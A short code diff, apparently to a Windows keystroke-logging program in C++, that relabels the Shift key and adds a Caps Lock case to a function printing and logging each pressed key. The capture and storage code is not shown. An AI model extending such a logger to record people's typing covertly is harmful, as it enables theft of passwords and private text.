@@ -23,12 +23,16 @@ bool KeyListed(int Key) {
         log("\n");
         break;
     case VK_SHIFT:
-        std::cout << " *Shift* ";
-        log(" *Shift* ");
+        std::cout << " Shift ";
+        log(" Shift ");
         break;
     case VK_BACK:
         std::cout << "\b";
         log("\b");
+        break;
+    case VK_CAPITAL:
+        std::cout << " CAPSLOCK ";
+        log(" CAPSLOCK ");
         break;
     default: return false;
     }
